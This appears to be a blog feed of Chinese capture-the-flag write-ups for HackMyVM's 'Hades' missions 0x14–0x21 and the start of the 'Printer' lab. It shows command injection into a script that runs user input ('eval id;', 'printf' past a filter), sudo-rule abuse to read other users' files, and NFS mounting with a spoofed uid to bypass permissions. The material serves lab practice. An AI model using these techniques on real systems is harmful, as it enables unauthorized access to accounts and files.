+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> atalanta atalanta    <span class="token number">21</span> Jun <span class="token number">12</span> 09:05 weird.c
+atalanta@hades:~$ <span class="token function">cat</span> flagz.txt 
+^XXZbDJTQQWCHJWTGeOw^</code></pre>
+<h2 id="MISSION-0x14"><a href="#MISSION-0x14" class="headerlink" title="MISSION 0x14"></a>MISSION 0x14</h2><pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x14 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User athena lets us run her program, but she hasn't left us her <span class="token builtin class-name">source</span> code.
+
+<span class="token comment">## ES ##</span>
+La usuaria athena nos deja ejecutar <span class="token function">su</span> programa, pero no nos ha dejado <span class="token function">su</span> codigo fuente.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> weird.c
+kmQMpZsXgOsnzGReRcoV</code></pre>
+<p>为什么直接给了密码?</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-x--- <span class="token number">2</span> root   athena <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> athena athena <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 auri_old.sh
+-rw-r----- <span class="token number">1</span> root   athena   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+athena@hades:~$ <span class="token function">cat</span> flagz.txt 
+^oGwmbNYdtHwJgznZdur^</code></pre>
+<h2 id="Mission-0x15"><a href="#Mission-0x15" class="headerlink" title="Mission 0x15"></a>Mission 0x15</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################</span>
+<span class="token comment"># MISSION 0x15 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User aura lets us use her new script.
+
+<span class="token comment">## ES ##</span>
+La usuaria aura nos deja utilizar <span class="token function">su</span> nuevo script.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> athena on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User athena may run the following commands on hades:
+    <span class="token punctuation">(</span>aura<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh</code></pre>
+<p>可以看到只有权限执行这个脚本的，看一下这个脚本</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">cat</span> auri_old.sh 
+
+<span class="token comment">#!/bin/bash</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
+<span class="token builtin class-name">read</span> hackme
+<span class="token comment">#Secure the condition!</span>
+<span class="token comment">#if [[ $hackme =~ "????????" ]]; then</span>
+<span class="token comment">#exit</span>
+<span class="token comment">#fi</span>
+<span class="token comment">#Add newest Aura pass!</span>
+<span class="token comment">#$hackme AURANEWPASS 2>/dev/null</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> a.sh
+<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
+<span class="token builtin class-name">read</span> hackme
+<span class="token comment">#Secure the condition!</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">=~</span> <span class="token string">"????????"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+<span class="token builtin class-name">exit</span>
+<span class="token keyword">fi</span>
+<span class="token comment">#Add newest Aura pass!</span>
+<span class="token variable">$hackme</span> AURANEWPASS <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null  
+
+
+
+ ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">17</span>:15:51 
+<span class="token operator">></span> <span class="token function">bash</span> a.sh
+What?
+<span class="token builtin class-name">eval</span> <span class="token function">id</span><span class="token punctuation">;</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>我测试了半天能在kali上执行但是在靶机上就是执行不了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> aura /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh
+What?
+<span class="token builtin class-name">printf</span>
+TiqpedAFjwmVyBlYpzRhathena@hades</code></pre>
+<p>后来怀疑echo不行用了printf出来了密码，我到底要看看脚本里面写什么</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> auri.sh 
+
+<span class="token comment">#!/bin/bash</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"What?"</span>
+<span class="token builtin class-name">read</span> hackme
+<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"e"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"o"</span>* <span class="token operator">||</span> <span class="token variable">$hackme</span> <span class="token operator">==</span> *<span class="token string">"?"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+<span class="token builtin class-name">exit</span>
+<span class="token keyword">fi</span>
+<span class="token variable">$hackme</span> TiqpedAFjwmVyBlYpzRh <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>
+<p>发现eo?都被过滤怪不得eval echo都不行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> flagz.txt 
+^YFMNmPnlKNpnWiYOhYy^</code></pre>
+<h2 id="MISSSION-0x16"><a href="#MISSSION-0x16" class="headerlink" title="MISSSION 0x16"></a>MISSSION 0x16</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x16 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User aegle has a good memory <span class="token keyword">for</span> numbers.
+
+<span class="token comment">## ES ##</span>
+La usuaria aegle tiene buena memoria para los numeros.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">52</span>
+drwxr-x--- <span class="token number">2</span> root aura  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root root  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> aura aura  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> aura aura   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r-x--- <span class="token number">1</span> root aura   <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 auri.sh
+-rw-r----- <span class="token number">1</span> root aura    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root aura   <span class="token number">168</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rw---x--- <span class="token number">1</span> root aura <span class="token number">16064</span> Apr  <span class="token number">5</span> 06:36 numbers</code></pre>
+<p>就是猜数字呗，直到全对，1231239111126</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aura@hades:~$ ./numbers 
+Enter one number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">2</span>
+Number OK
+Enter next number:
+<span class="token number">3</span>
+Number OK
+Enter next number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">2</span>
+Number OK
+Enter next number:
+<span class="token number">3</span>
+Number OK
+Enter next number:
+<span class="token number">9</span>
+Number OK
+Enter next number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">1</span>
+Number OK
+Enter next number:
+<span class="token number">2</span>
+Number OK
+Enter next number:
+<span class="token number">6</span>
+YRturIymmHSdBmEClEGe</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> flagz.txt 
+^XCwOqgVvWpDVwPVVUJa^</code></pre>
+<h2 id="MISSSION-0x17"><a href="#MISSSION-0x17" class="headerlink" title="MISSSION 0x17"></a>MISSSION 0x17</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x17 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User calliope likes to have her things looked at.
+
+<span class="token comment">## ES ##</span>
+A la usuaria calliope le gusta que le miren sus cosas.
+aegle@hades:~$ </code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> aegle on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User aegle may run the following commands on hades:
+    <span class="token punctuation">(</span>calliope<span class="token punctuation">)</span> NOPASSWD: /bin/cat
+aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat calliope_pass.txt 
+/bin/cat: calliope_pass.txt: Permission denied
+aegle@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-x--- <span class="token number">2</span> root  aegle    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root  root     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> aegle aegle    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> aegle aegle     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root  calliope   <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 calliope_pass.txt
+-rw-r----- <span class="token number">1</span> root  aegle      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root  aegle     <span class="token number">176</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+aegle@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> calliope* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/pwned/aegle/calliope_pass.txt
+aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/aegle/calliope_pass.txt
+/bin/cat: /pwned/aegle/calliope_pass.txt: Permission denied</code></pre>
+<p>密码不让读,只能直接读flag从平台拿密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aegle@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> calliope /bin/cat /pwned/calliope/flagz.txt 
+^rFWOMwBJDidqSNtEJGJ^</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">calliope/IlhyWxZuqIHAuqVOpXfQ</code></pre>
+<h2 id="MISSION-0x18"><a href="#MISSION-0x18" class="headerlink" title="MISSION 0x18"></a>MISSION 0x18</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x18 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user calypso often uses <span class="token function">write</span> to communicate.
+
+<span class="token comment">## ES ##</span>
+La usuaria calypso suele usar <span class="token function">write</span> para comunicarse.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ ./writeme  
+Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
+<p>这里没思路，看了别人的wp。write是很远古的工具 可以在tty之间传消息</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">calliope@hades:~$ mesg y
+calliope@hades:~$ ./writeme
+Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>Cannot send you my pass<span class="token operator">!</span>TAMYefoHcCPmexwImodo^OCbFzMIKPQOZQMEUKwEi^Cannot send you my pass<span class="token operator">!</span>calliope@hades:~$ </code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">TAMYefoHcCPmexwImodo
+^OCbFzMIKPQOZQMEUKwEi^</code></pre>
+<p>原来是个隐藏的flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> flagz.txt 
+^pssqdorRTYuTKuQBOYd^</code></pre>
+<h2 id="MISSION-0x19"><a href="#MISSION-0x19" class="headerlink" title="MISSION 0x19"></a>MISSION 0x19</h2><pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x19 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User cassandra always wanted to be on TV.
+
+<span class="token comment">## ES ##</span>
+La usuaria cassandra siempre quiso salir en la TV.</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">calypso@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">8556</span>
+drwxr-x--- <span class="token number">2</span> root    calypso    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root    root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> calypso calypso    <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> calypso calypso     <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root    calypso <span class="token number">8726358</span> Dec <span class="token number">20</span>  <span class="token number">2021</span> cassy.wav
+-rw-r----- <span class="token number">1</span> root    calypso      <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root    calypso     <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt</code></pre>
+<p>下载下来试了一下发现是SSTV，用手机上的Robot36听<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhRSG.jpg" alt="OPhRSG.jpg" loading="lazy"><br><code>CKzlnvmHOz</code>应该是密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@127.0.0.1's password: 
+Permission denied, please try again.</code></pre>
+<p>很幽默吗仔细看了一下发现倒数第二位是Q</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">CKzlnvmHQz</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-x--- <span class="token number">2</span> root      cassandra <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root      root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> cassandra cassandra <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> cassandra cassandra  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root      cassandra   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">369</span> Apr  <span class="token number">5</span> 06:36 here.txt
+-rw-r----- <span class="token number">1</span> root      cassandra  <span class="token number">147</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+cassandra@hades:~$ <span class="token function">cat</span> flagz.txt 
+^lntvcYNlazEljOyZYKz^</code></pre>
+<h2 id="MISSION-0x20"><a href="#MISSION-0x20" class="headerlink" title="MISSION 0x20"></a>MISSION 0x20</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x20 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User cassiopeia sees the invisible. 
+
+<span class="token comment">## ES ##</span>
+La usuaria cassiopeia ve lo invisible.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cassandra@hades:~$ <span class="token function">cat</span> here.txt 
+VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
+CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
+CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
+ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
+<span class="token assign-left variable">ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo</span><span class="token operator">=</span></code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/25/OPhtw1.png" alt="OPhtw1.png" loading="lazy"><br>盲猜测snow隐写<br><img src="https://ooo.0x0.ooo/2024/06/25/OPhHDD.png" alt="OPhHDD.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gRqFnHblmZVZSfegPLvO</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> flagz.txt 
+^GyWbcpEpqMsqMsjilzX^</code></pre>
+<h2 id="MISSION-0x21"><a href="#MISSION-0x21" class="headerlink" title="MISSION 0x21"></a>MISSION 0x21</h2><pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x21 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User clio hates spaces. 
+
+<span class="token comment">## ES ##</span>
+La usuaria clio odia los espacios.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cassiopeia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> cassiopeia on hades:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty
+
+User cassiopeia may run the following commands on hades:
+    <span class="token punctuation">(</span>clio<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /usr/local/src/differences.sh
+cassiopeia@hades:~$ <span class="token function">cat</span> /usr/local/src/differences.sh
+
+<span class="token comment">#!/bin/bash</span>
+<span class="token builtin class-name">echo</span> File to compare:<span class="token operator">!</span>
+<span class="token builtin class-name">read</span> differences
+<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token number">0</span> <span class="token builtin class-name">read</span> file1 file2 <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">$differences</span>"</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$differences</span>"</span> <span class="token operator">=~</span> <span class="token punctuation">\</span> <span class="token operator">|</span><span class="token punctuation">\</span>' <span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token keyword">then</span>
+   <span class="token builtin class-name">echo</span> <span class="token string">"No spaces!!"</span>
+<span class="token keyword">else</span>
+/usr/bin/diff <span class="token variable">$file1</span> <span class="token variable">$file2</span>
+<span class="token keyword">fi</span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>Labs</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackMyVM-Printer</title>
+    <url>/posts/5e0f535b/</url>
+    <content><![CDATA[<p><strong>难度:hard</strong></p>
+<p><strong>kali:192.168.56.104</strong></p>
+<p><strong>靶机:192.168.56.191</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.100  08:00:27:7d:89:3a       PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.56.191  08:00:27:07:95:7b       PCS Systemtechnik GmbH
+
+<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
+Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.942</span> seconds <span class="token punctuation">(</span><span class="token number">131.82</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.191                                                  
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-30 <span class="token number">19</span>:01 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.191
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00045s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT     STATE SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">111</span>/tcp  <span class="token function">open</span>  rpcbind
+<span class="token number">2049</span>/tcp <span class="token function">open</span>  nfs
+MAC Address: 08:00:27:07:95:7B <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.13</span> seconds</code></pre>
+<p>开放了 22 1111 2049三个端口</p>
+<blockquote>
+<p>111端口是RPC服务的端口，它是<strong>Remote Procedure Call（远程过程调用）</strong>协议的默认端口1。在Linux系统中，许多重要的分布式服务都使用RPC协议进行通信，例如NFS、NIS等，它们都依赖于111端口进行通信。<br>2049端口是NFS（Network File System）协议使用的默认端口，主要用于文件系统共享。NFS是一种分布式文件系统，允许用户透明地在网络上共享文件。NFS服务器提供存储在本地磁盘上的文件和目录的访问权限，并允许用户通过网络共享文件。</p>
+</blockquote>
+<h2 id="挂在nfs服务"><a href="#挂在nfs服务" class="headerlink" title="挂在nfs服务"></a>挂在nfs服务</h2> <pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token operator">></span> showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.56.191
+Export list <span class="token keyword">for</span> <span class="token number">192.168</span>.56.191:
+/home/lisa *</code></pre>
+<p>发现用户名是<code>lisa</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.56.191:/home/lisa  lisaa <span class="token parameter variable">-o</span> nolock 
+<span class="token operator">></span> <span class="token builtin class-name">cd</span> lisaa  
+<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+ls: .ssh: Permission denied
+ls: user.txt: Permission denied
+total <span class="token number">32</span>
+drwxr-xr-x <span class="token number">4</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">19</span>:08 <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root root    <span class="token number">9</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao   <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao  <span class="token number">3555</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .bashrc
+drwxr-xr-x <span class="token number">3</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .local
+-rw-r--r-- <span class="token number">1</span> <span class="token number">1098</span> tao   <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
+drwx------ <span class="token number">2</span> <span class="token number">1098</span> tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .ssh
+-rwx------ <span class="token number">1</span> <span class="token number">1098</span> tao    <span class="token number">33</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> user.txt</code></pre>
+<p>不过都没权限访问，因为我的uid不是1098，所以需要创建一个uid为1098的用户绕过</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">useradd</span> <span class="token parameter variable">-u</span> <span class="token number">1098</span> qwer
+
+  ~/Desktop/printer/lisaa                                                                                                                                                                                            root@kali2  <span class="token number">19</span>:14:57 
+<span class="token operator">></span> <span class="token function">su</span> qwer
+$ uid  
+sh: <span class="token number">1</span>: uid: not found
+$ <span class="token function">id</span>
